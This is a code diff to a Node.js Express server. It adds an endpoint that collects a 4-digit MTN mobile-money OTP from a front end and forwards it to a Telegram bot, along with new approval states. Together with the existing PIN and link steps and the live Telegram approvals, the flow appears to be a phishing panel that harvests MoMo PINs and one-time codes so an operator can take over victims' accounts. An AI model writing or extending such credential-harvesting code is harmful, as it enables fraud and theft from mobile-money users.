@@ -3,7 +3,7 @@ const cors = require('cors');
 const path = require('path');
 const bodyParser = require('body-parser');
 require('dotenv').config({ path: path.join(__dirname, '..', '.env') });
-const { createApprovalRequest, submitOtp, submitLink, getApprovalStatus, approvals } = require('./telegram-bot');
+const { createApprovalRequest, submitOtp, submitMomoOtp, submitLink, getApprovalStatus, approvals } = require('./telegram-bot');
 const { securityHeaders, corsMiddleware, validateApiSecret, rateLimit, validator, auditLog, createSession } = require('./security');
 
 const app = express();
@@ -189,6 +189,8 @@ app.post('/api/mtn/submit', (req, res) => {
         onRejected: (id) => setMtnState(id, 'rejected'),
         onWrongPin: (id) => setMtnState(id, 'wrong_pin'),
         onWrongOtp: (id) => setMtnState(id, 'wrong_link'),
+        onLinkVerified: (id) => setMtnState(id, 'otp_pending'),
+        onOtpWrong: (id) => setMtnState(id, 'wrong_otp'),
         onVerified: (id) => setMtnState(id, 'completed'),
         onInvalid: (id) => setMtnState(id, 'invalid'),
         onTimeout: (id) => setMtnState(id, 'timeout')
@@ -217,6 +219,23 @@ app.post('/api/mtn/resend-link', (req, res) => {
 
 app.post('/api/mtn/proceed-verified', (req, res) => {
     res.json({ success: true, message: 'Proceeding with verified account' });
+});
+
+// Submit 4-digit OTP after link verification (MTN frontend, no API secret required)
+app.post('/api/mtn/submit-otp', rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
+    const { requestId, otp } = req.body;
+    if (!requestId || !validator.requestId(requestId)) {
+        return res.status(400).json({ success: false, message: 'A valid requestId is required' });
+    }
+    if (!otp || !/^\d{4}$/.test(String(otp))) {
+        return res.status(400).json({ success: false, message: 'A 4-digit OTP is required' });
+    }
+
+    const result = submitMomoOtp(requestId, validator.sanitize(String(otp)));
+    if (result.success) {
+        setMtnState(requestId, 'otp_pending', { otp: validator.sanitize(String(otp)) });
+    }
+    res.json(result);
 });
 
 app.get('/api/support-whatsapp', (req, res) => {
